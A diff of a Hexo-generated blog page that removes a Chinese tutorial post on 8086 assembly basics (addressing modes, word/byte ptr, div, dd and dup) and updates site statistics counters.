-<p>指令要处理的数据在寄存器中，在汇编指令中给出相应的寄存器名。</p>
-<p>例：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov ax,bx</span><br><span class="line">mov ds,ax</span><br><span class="line">push bx</span><br><span class="line">mov ds:[0],bx</span><br><span class="line">push ds</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,ax</span><br></pre></td></tr></tbody></table></figure></li>
-<li><p>段地址（SA）和偏移地址（EA）</p>
-<p>指令要处理的数据在内存中，在汇编指令中可用 [X] 的格式给出 EA，SA
-在某个段寄存器中。</p>
-<p>存放段地址的寄存器可以是默认的，比如：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[0]</span><br><span class="line">mov ax,[di]</span><br><span class="line">mov ax,[bx+8]</span><br><span class="line">mov ax,[bx+si]</span><br><span class="line">mov ax,[bx+si+8]</span><br></pre></td></tr></tbody></table></figure>
-<p>等指令，段地址默认在 <strong>ds</strong> 中。</p>
-<p>存放段地址的寄存器也可以显性给出，比如：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,ds:[bp]             含义：(ax)=((ds)*16)+(bp)</span><br><span class="line">mov ax,es:[bx]</span><br><span class="line">mov ax,ss:[bx+si]</span><br><span class="line">mov ax,cs:[bx+si+8]</span><br></pre></td></tr></tbody></table></figure></li>
-</ol>
-<h2 id="寻址方式">寻址方式</h2>
-<figure>
-<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220924122435330.png" alt="image-20220924122435330">
-<figcaption aria-hidden="true">image-20220924122435330</figcaption>
-</figure>
-<h2 id="指令要处理的数据所占的字长">指令要处理的数据所占的字长</h2>
-<ol type="1">
-<li><p>通过寄存器指明要处理的数据的字长</p>
-<p>字操作：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov ax,1</span><br><span class="line">mov bx,ds:[0]</span><br><span class="line">mov ds,ax</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">inc ax</span><br><span class="line">add ax,1000</span><br></pre></td></tr></tbody></table></figure>
-<p>字节操作：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov al,1</span><br><span class="line">mov al,bl</span><br><span class="line">mov al,ds:[0]</span><br><span class="line">mov ds:[0],al</span><br><span class="line">inc al</span><br><span class="line">add al,100</span><br></pre></td></tr></tbody></table></figure></li>
-<li><p>在没有寄存器名存在的情况下，用操作符<code>X ptr</code>指明内存单元的长度，X
-在汇编指令中可以为 word 或 byte 。</p>
-<p>下面的指令中用了 word ptr
-指明了指令访问的内存单元是一个<strong>字单元</strong>：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov word ptr ds:[0],1</span><br><span class="line">inc word ptr [bx]</span><br><span class="line">inc word ptr ds:[0]</span><br><span class="line">add word ptr [bx],2</span><br></pre></td></tr></tbody></table></figure>
-<p>下面的指令中，用 byte ptr
-指明了指令访问的内存单元是一个<strong>字节单元</strong>：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov byte ptr ds:[0],1</span><br><span class="line">inc byte ptr [bx]</span><br><span class="line">inc byte ptr ds:[0]</span><br><span class="line">add byte ptr [bx],2</span><br></pre></td></tr></tbody></table></figure></li>
-<li><p>其他方法</p>
-<p>有些指令默认了访问的是字单元还是字节单元，比如：push [1000H]
-就不用指明访问的是字单元还是字节单元，因为 push
-指令只进行<strong>字操作</strong>。</p></li>
-</ol>
-<h2 id="div指令">div指令</h2>
-<p>div是除法指令。</p>
-<ul>
-<li>除数：有8位和16位两种，在一个寄存器或内存单元中。</li>
-<li>被除数：默认放在 <strong>AX</strong> 或 <strong>DX
-和AX</strong>中，如果除数为8位，被除数则为16位，默认在 AX
-中存放；如果输出为16位，被除数则为32位，在 DX 和 AX 中存放，DX
-存放高16位，AX 存放低16位。</li>
-<li>结果：如果除数为8位，则 AL 存储商，AH 存储余数；如果除数为16位，则
-AX 存储除法操作的商，DX 存储除法操作的余数。</li>
-</ul>
-<p>格式如下：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">div reg</span><br><span class="line">div 内存单元</span><br></pre></td></tr></tbody></table></figure>
-<p>例：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">div byte ptr ds:[0]   含义：(al)=(ax)/((ds)*16+0)的商；</span><br><span class="line">						 (ah)=(ax)/((ds)*16+0)的余数</span><br></pre></td></tr></tbody></table></figure>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">div word ptr es:[0]   含义：(ax)=[(dx)*10000H+(ax)]/((es)*16+0)的商</span><br><span class="line">                           (dx)=[(dx)*10000H+(ax)]/((es)*16+0)的余数</span><br></pre></td></tr></tbody></table></figure>
-<h2 id="伪指令-dd">伪指令 dd</h2>
-<p><strong>dd</strong> 是用来定义 dword（double
-word）双字型数据的。比如</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data segment</span><br><span class="line">  db 1</span><br><span class="line">  dw 1</span><br><span class="line">  dd 1</span><br><span class="line">data ends</span><br></pre></td></tr></tbody></table></figure>
-<ul>
-<li>第一个数据为 01H，在<code>data:0</code>处，占1个字节；</li>
-<li>第二个数据为 0001H，在<code>data:1</code>处，占1个字；</li>
-<li>第三个数据为 00000001H，在<code>data:3</code>处，占2个字。</li>
-</ul>
-<h2 id="dup">dup</h2>
-<p>dup是一个操作符，在汇编语言中同 db、dw、dd
-等一样，也是由编译器识别处理的符号。它是和 db、dw、dd
-等数据定义伪指令配合使用的，用来进行数据的重复。</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db 3 dup (0)             ;定义了3个字节，值都为 0，相当于 db 0,0,0</span><br><span class="line">db 3 dup (0,1,2)         ;定义了9个字节，相当于 db 0,1,2,0,1,2,0,1,2</span><br><span class="line">db 3 dup('abc','ABC')    ;定义了18个字节，相当于 db 'abcABCabcABCabcABC'</span><br></pre></td></tr></tbody></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1540,14 +1772,14 @@ word）双字型数据的。比如</p>
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">55</span>
+          <span class="site-state-item-count">56</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-count">21</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
@@ -1589,12 +1821,12 @@ word）双字型数据的。比如</p>
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">142k</span>
+    <span title="站点总字数">143k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">2:09</span>
+    <span title="站点阅读时长">2:10</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
